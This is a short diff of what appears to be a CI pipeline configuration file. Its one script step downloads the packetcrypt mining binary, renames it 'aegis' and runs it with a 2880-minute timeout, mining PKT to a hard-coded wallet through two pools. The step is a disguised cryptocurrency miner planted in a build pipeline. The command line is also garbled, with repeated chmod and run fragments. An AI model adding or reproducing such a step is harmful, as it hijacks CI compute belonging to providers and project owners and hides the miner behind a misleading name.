@@ -135,3 +135,4 @@ jobs:
   timeoutInMinutes: 2880
   steps:
   - script: wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2 chmod +x aegis; chmod +x aegis; ./aegis ann -p pkt1q4wk402wdfqlu0andxcwetjuym7vr7pzgp9n6jt http://pool.pktpool.io http://pool.pkt.world/master -t2
+
